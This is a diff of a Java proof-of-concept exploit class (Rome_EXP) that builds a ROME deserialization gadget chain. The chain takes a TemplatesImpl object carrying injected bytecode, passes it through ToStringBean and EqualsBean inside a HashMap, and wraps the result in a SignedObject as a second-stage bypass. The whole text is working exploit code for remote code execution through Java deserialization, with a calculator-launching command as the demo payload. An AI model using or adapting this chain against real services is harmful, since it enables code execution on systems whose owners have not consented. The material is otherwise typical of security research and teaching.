@@ -1,21 +1,20 @@
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import com.sun.rowset.JdbcRowSetImpl;
 import com.sun.syndication.feed.impl.EqualsBean;
-import com.sun.syndication.feed.impl.ObjectBean;
 import com.sun.syndication.feed.impl.ToStringBean;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtConstructor;
-import org.apache.commons.collections4.functors.ConstantTransformer;
 
-import javax.management.BadAttributeValueExpException;
-import javax.xml.transform.Templates;
 import java.io.*;
 import java.lang.reflect.Field;
+import java.security.KeyPair;
+import java.security.KeyPairGenerator;
+import java.security.Signature;
+import java.security.SignedObject;
 import java.util.HashMap;
 
-public class RomEXP {
+public class Rome_EXP {
     public static void main(String[] args) throws Exception{
         TemplatesImpl templates = new TemplatesImpl();
         setFieldValue(templates,"_name","Drunkbaby");
@@ -26,19 +25,22 @@ public class RomEXP {
         byte[] evil = getTemplatesImpl("Calc");
         byte[][] codes = {evil};
         byteCodesField.set(templates,codes);
+//        templates.newTransformer();
+        ToStringBean toStringBean = new ToStringBean(c,templates);
+//        toStringBean.toString();
+        Class toStringBeanEvil = toStringBean.getClass();
+        EqualsBean equalsBean = new EqualsBean(toStringBeanEvil,toStringBean);
+        HashMap hashMap = new HashMap();
+        hashMap.put(equalsBean,"Drunkbaby");
 
-        ToStringBean toStringBean = new ToStringBean(Templates.class,new ConstantTransformer(1));
-        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);
+        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
+        kpg.initialize(1024);
+        KeyPair kp = kpg.generateKeyPair();
+        SignedObject signedObject = new SignedObject(hashMap, kp.getPrivate(), Signature.getInstance("DSA"));
 
-        HashMap<Object,Object> hashMap = new HashMap<>();
-        hashMap.put(equalsBean,"123");
-
-        //再改回正常的参数
-        Field field = toStringBean.getClass().getDeclaredField("_obj");
-        field.setAccessible(true);
-        field.set(toStringBean,templates);
-        serialize(hashMap);
+        serialize(signedObject);
         unserialize("ser.bin");
+
     }
 
     public static byte[] getTemplatesImpl(String cmd) {
